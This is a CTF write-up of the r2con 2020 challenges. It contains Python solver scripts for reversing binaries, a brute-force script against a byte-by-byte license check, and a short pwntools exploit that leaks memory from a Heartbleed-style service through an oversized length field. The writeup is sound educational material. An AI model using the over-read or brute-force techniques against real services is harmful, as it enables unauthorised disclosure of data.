# R2Con CTF 2020 - Writeups
-- By [S01den](https://twitter.com/s01den) (07/09/2020) --

The r2con and its CTF just ended, it was an awesome event !
The CTF was pretty fun and I finished 5th.
I can't wait for the r2con 2021 ! 
In this short paper, I'll share you my notes on the challenges I solved.

## Hellcode

Hellcode is a challenge evaluated as "easy".
It consists on a list of 111 small ELF binaries in which information (the flag) is hidden.
First of all, we can notice that all the binaries have the same size, 5368 bytes.
```
[solden@solden-pc hellcode]$ ls -al
-rwxr-xr-x 1 solden solden 5368  3 sept. 20:09 binary0
-rwxr-xr-x 1 solden solden 5368  3 sept. 20:09 binary1
-rwxr-xr-x 1 solden solden 5368  3 sept. 20:09 binary10
-rwxr-xr-x 1 solden solden 5368  3 sept. 20:09 binary100
-rwxr-xr-x 1 solden solden 5368  3 sept. 20:09 binary101
-rwxr-xr-x 1 solden solden 5368  3 sept. 20:09 binary102
```
Let's spot the differences between theses files:
```bash
[solden@solden-pc hellcode]$ radiff2 binary0 binary1
0x000010bc 53 => 3c 0x000010bc
0x000010d6 ff => 33 0x000010d6
0x0000131e 696f65306a5f336c => 63316770756e6f5f 0x0000131e
[solden@solden-pc hellcode]$ radiff2 binary0 binary97
0x000010bb ea53 => f247 0x000010bb
0x000010d6 ff => 22 0x000010d6
0x0000131e 696f65306a5f336c => 73365f6630653636 0x0000131e
```
Okay, the differences in 0x131e aren't important here (it's just a kind of temporary name the file had).
So now, we know that there is only 2 important differences between the files.
Let's investigate that with radare2.
We get the following instructions for binary0:
```
     │││╎   0x100000ba      80ea53         sub dl, 0x53                ; 83
     │││    0x100000d4      80faff         cmp dl, 0xff                ; 255
```
And this one for binary 97:
```
     │││╎   0x100000ba      80f247         xor dl, 0x47                ; 71
     │││    0x100000d4      80fa22         cmp dl, 0x22                ; 34
```
Now we can extract theses interesting values in each binary, we get the lists k1 (x in "operation dl, x") and k2 (x in "cmp dl, x").
After that we just need to extract the correct operation in each binary (sub, xor or add) in order to calculate each bytes of the hidden message (containing the flag).

```Python
import r2pipe

k1 = [83, 60, 22, 13, 67, 57, 21, 24, 62, 31, 63, 59, 25, 25, 62, 78, 22, 57, 11, 90, 11, 100, 60, 78, 93, 81, 12, 79, 40, 72, 39, 11, 43, 51, 32, 76, 13, 60, 89, 93, 38, 50, 14, 19, 54, 67, 70, 50, 66, 78, 55, 26, 51, 7, 72, 76, 23, 2, 26, 25, 69, 62, 86, 76, 69, 5, 34, 67, 51, 21, 26, 47, 53, 33, 48, 30, 81, 87, 42, 78, 85, 89, 24, 68, 84, 14, 15, 1, 93, 70, 48, 96, 49, 70, 65, 29, 12, 71, 39, 55, 92, 35, 82, 38, 84, 41, 19, 93, 2, 7, 45]
k2 = [255, 51, 93, 88, 48, 89, 118, 90, 39, 63, 177, 160, 125, 19, 94, 56, 127, 54, 119, 11, 127, 23, 92, 47, 47, 20, 44, 177, 68, 189, 62, 39, 11, 71, 136, 41, 45, 162, 53, 190, 141, 18, 119, 96, 22, 181, 236, 149, 177, 32, 68, 42, 69, 94, 186, 10, 36, 49, 126, 112, 179, 89, 181, 35, 3, 100, 32, 38, 161, 118, 104, 70, 254, 82, 173, 50, 113, 184, 68, 42, 203, 8, 132, 40, 204, 122, 89, 110, 208, 31, 16, 2, 88, 40, 32, 85, 101, 34, 76, 87, 189, 81, 183, 70, 186, 70, 133, 195, 123, 104, 88]

for i in range(111):
    f = "binary"+str(i)
    """
    # the piece of code to extract k1 and k2
    file = open(f,"rb")
    c = bytearray(file.read())
    k1.append((c[0x10bc]))
    k2.append((c[0x10d6]))
    """
    r = r2pipe.open(f)
    r.cmd('s 0x100000ba')
    cm = r.cmd('pd 1')
    if 'add' in cm:
        print(chr((k2[i]-k1[i])&0xff))
    elif 'sub' in cm:
        print(chr((k2[i]+k1[i])&0xff))
    elif 'xor' in cm:
        print(chr((k2[i]^k1[i])&0xff))
```
With this script, we can finally get the flag: 
r2con{0verF33ding_oF_Binari3s}

## eXit
This one is another easy challenge, consisting in a textual-based game in which we have to find a hidden answer to get the flag.
I won't go into details because I didn't take a lot of notes, but we just need to grab some arrays and perform simple operations on them.

```Python
a = [0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0x13, 0x37, 0xca, 0xfe, 0x13, 0x37, 1, 2 , 3, 4, 5, 6, 7, 8, 9, 0x0a, 0x7f, 0x67]
b = [0x97, 0xcd, 0xd2, 0xd6, 0xc0, 0xc7, 0xcd, 0x84, 0xec, 0x91, 0xad, 0x62, 0xf5, 0xf1, 0x65, 0x22, 0x58, 0x82, 0xb1, 0x37, 0x61, 0x3e, 0x5d] # s 0x207b ; pd 20
c = [0x0a, 0x09, 0x08, 0x07, 0x06, 0x05, 0x04, 0x03, 0x02, 0x01, 0x37, 0x13, 0x37, 0x13, 0xfe, 0xca, 0x37, 0x13, 0x37, 0x13]
d = [0x9c, 0xcd, 0xe1, 0x8e, 0xb0, 0x92, 0xd7, 0x91, 0xc0, 0x9e, 0xb2] # s 0x20c7 ; pd 10
f = ""
for i in range(len(c)):
	print(chr(((b[i]-c[i])^a[i])&0xff))
	f += chr(((b[i]-c[i])^a[i])&0xff)
print(f)

f = ""
for i in range(len(d)):
	print(chr(((d[i]-c[i])^a[i])&0xff))
	f += chr(((d[i]-c[i])^a[i])&0xff)
print(f)
```
With that, we finally obtain the flag !
r2con{Sit down next to my friendLight matchStay}

##  Defuse 

Defuse is the last easy challenge I solved during this CTF.
By disassembling it with r2 we found the function which transforms every char of the flag we submit in order to compare them with the "ciphered" bytes of the flag.
However, the "AND" operation isn't fully reversible so there is a looooooot of different input which makes the binary saying "[*] You got the flag! You saved the world from the end!"
So first, we apply the transform function to the whole alphabet to get a table of correspondence.
Then, with this dirty script we can generate all theses potential flags.

```Python
def transform(byte):
	byte ^= 0x28
	byte += 0x15
	byte &= 0x5ff5fff5
	return byte

for i in range(0x60,0x7f):
	print(chr(i),':',hex(transform(i)))

ciphered = [0x60,0x70,0x54,0x51,0x65,0x70,0x51,0x60,0x65,0x54,0x51,0x60,0x50,0x54,0x65,0x60,0x71,0x54,0x50,0x60]
one = "aio" # 0x54
two = "ce"  # 0x60
three = "km"# 0x50
four = "ln" # 0x51
five = "prxz" # 0x65
six = "su" # 0x70
seven = "tv" # 0x71

for e in five:
	for f in six:
		for g in four:
			for h in two:
				for i in five:
					for j in one:
						for k in four:
							for l in two:
								for m in three:
									for n in one:
										for o in five:
											for p in two:
												for q in seven:
													for r in one:
														for s in three:
															for t in two:
																flag = "esil"+e+f+g+h+i+j+k+l+m+n+o+p+q+r+s+t
																print(flag)

"""

a, i, o : 0x54
c, e, : 0x60
k, m : 0x50
l, n : 0x51
p, r, x, z : 0x65
s, u: 0x70
t, v : 0x71
"""
```

The hint said that the correct flag is a grammatically-correct sentence which begins with "esil",
so by grepping we found r2con{esilrulezonemoretime} .

## Radare License Checker

This one is a "medium" challenge, consisting of a binary checking the license key of a dystopic version of radare2.
However the check is made byte per byte, and the program tell us in which byte the decryption failed.
So we can easily write a bruteforcing script:

```Python
from pwn import *

done = 6
true_flag = "r2con{"

for i in range(done,0x22):
    for charac in range(ord(' ')+1,0x7f):

        password = ""
        password += true_flag
        password += chr(charac)
        password += "A"*(33-done)

        cmd = ["/bin/wine", "radarelicensechecker.exe",password]
        print(cmd)
        r = process(cmd)
        line = r.recvuntil("!")

        if(int(line[len(line)-3:len(line)-1]) != i):
            print("yay ! ---> "+chr(charac))
            true_flag += chr(charac)
            
            flag = open("flag.txt","w")
            flag.write("%s"%true_flag)
            flag.close()

            done+=1
            break

 ```
 After a couple of hours, we get the flag: r2con{D0nt_Do_Crypt0_At_Hom3_Kids}
 
 ## Bleeding hearts

This one was another "medium" crackme, it was a pwn challenge.
It consists of the binary of a service, (running online at challenges.0xmurphy.me:4444) vulnerable to a vulnerability similar to heartbleed, as we can guess with the title.
*"The vulnerability is classified as a [buffer over-read](https://en.wikipedia.org/wiki/Buffer_over-read "Buffer over-read"),[[5]](https://en.wikipedia.org/wiki/Heartbleed#cite_note-cve-5) a situation where more data can be read than should be allowed.[[6]](https://en.wikipedia.org/wiki/Heartbleed#cite_note-6)"*, thanks Wikipedia !
First we reverse the "protocol" with radare2, by a dynamic analysis; then we spot that 0x405360 contains the flag (read from flag.txt), and we can write whatever we want in 0x405160.
The struct of the leaking request is **<PLEASE REPLY \<msg\>[randomshit][size_of_msg]>**
But if we attribute a big value to size_of_msg, we are able to read the flag, which isn't far from our "msg" in memory.

```Python
from pwn import *

r = remote("challenges.0xmurphy.me",4444)
r.sendline("!CLIENT HELLO!")
print(r.recv())
r.sendline("?ECHO REQUEST?")
print(r.recv())
end_payload = "<PLEASE REPLY <"+"A"*512+">[AAAA][608]>"
r.sendline(end_payload)
print(r.recv())

```
However for this challenge I forgot to save the flag in my notes...

That's all !
